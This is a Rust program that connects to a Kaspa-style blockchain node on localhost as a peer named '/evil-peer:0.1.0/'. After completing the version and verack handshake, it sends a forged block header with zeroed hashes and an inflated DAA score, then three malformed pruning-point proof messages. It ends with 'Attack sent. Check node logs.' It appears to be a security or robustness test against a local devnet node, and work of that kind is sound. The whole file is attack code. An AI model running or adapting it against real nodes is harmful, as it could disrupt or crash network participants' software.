use kaspa_p2p_lib::pb::{
    kaspad_message::Payload, BlockHeader, BlockMessage, Hash, KaspadMessage, NetAddress, PruningPointProofHeaderArray,
    PruningPointProofMessage, VerackMessage, VersionMessage,
};
use prost::Message;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

async fn write_msg(stream: &mut TcpStream, msg: KaspadMessage) -> Result<(), Box<dyn std::error::Error>> {
    let bytes = msg.encode_to_vec();
    // LITTLE ENDIAN length prefix
    stream.write_all(&(bytes.len() as u32).to_le_bytes()).await?;
    stream.write_all(&bytes).await?;
    Ok(())
}

async fn read_msg(stream: &mut TcpStream) -> Result<KaspadMessage, Box<dyn std::error::Error>> {
    let mut len_buf = [0u8; 4];
    stream.read_exact(&mut len_buf).await?;
    let len = u32::from_le_bytes(len_buf) as usize;
    let mut buf = vec![0u8; len];
    stream.read_exact(&mut buf).await?;
    Ok(KaspadMessage::decode(&buf[..])?)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut stream = TcpStream::connect("127.0.0.1:26611").await?;

    // IPv4-mapped IPv6 address (16 bytes)
    let ip_v6 = vec![0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0xff, 0xff, 127, 0, 0, 1];

    let version = VersionMessage {
        protocol_version: 11, // Hardcoded again
        network: "zethora-devnet".to_string(),
        user_agent: "/evil-peer:0.1.0/".to_string(),
        timestamp: 0,
        address: Some(NetAddress { timestamp: 0, ip: ip_v6, port: 26611 }),
        id: vec![1u8; 16],
        ..Default::default()
    };

    println!("Sending Version...");
    write_msg(&mut stream, KaspadMessage { payload: Some(Payload::Version(version)), request_id: 0, response_id: 0 }).await?;

    let reply = match read_msg(&mut stream).await {
        Ok(m) => m,
        Err(e) => {
            println!("Read error: {}", e);
            return Ok(());
        }
    };

    if !matches!(reply.payload, Some(Payload::Version(_))) {
        println!("Node rejected Version. Payload: {:?}", reply.payload);
        return Ok(());
    }
    println!("Received Version.");

    println!("Sending Verack...");
    write_msg(&mut stream, KaspadMessage { payload: Some(Payload::Verack(VerackMessage {})), request_id: 0, response_id: 0 }).await?;

    let reply2 = read_msg(&mut stream).await?;
    if !matches!(reply2.payload, Some(Payload::Verack(_))) {
        println!("Node rejected Verack. Payload: {:?}", reply2.payload);
        return Ok(());
    }
    println!("Handshake complete!");

    println!("Sending fake block...");
    let header = BlockHeader {
        version: 0,
        hash_merkle_root: Some(Hash { bytes: vec![0; 32] }),
        accepted_id_merkle_root: Some(Hash { bytes: vec![0; 32] }),
        utxo_commitment: Some(Hash { bytes: vec![0; 32] }),
        timestamp: 0,
        bits: 0,
        nonce: 0,
        daa_score: 100_000_000_000,
        blue_score: 0,
        blue_work: vec![0; 32],
        pruning_point: Some(Hash { bytes: vec![0; 32] }),
        parents: vec![],
    };

    write_msg(
        &mut stream,
        KaspadMessage {
            payload: Some(Payload::Block(BlockMessage { header: Some(header.clone()), transactions: vec![] })),
            request_id: 0,
            response_id: 0,
        },
    )
    .await?;

    tokio::time::sleep(Duration::from_secs(2)).await;

    for i in 1..=3 {
        println!("Sending bad proof #{}...", i);
        let proof = PruningPointProofMessage { headers: vec![PruningPointProofHeaderArray { headers: vec![header.clone()] }] };

        write_msg(&mut stream, KaspadMessage { payload: Some(Payload::PruningPointProof(proof)), request_id: 0, response_id: 0 })
            .await?;
        tokio::time::sleep(Duration::from_millis(500)).await;
    }

    println!("Attack sent. Check node logs.");
    Ok(())
}
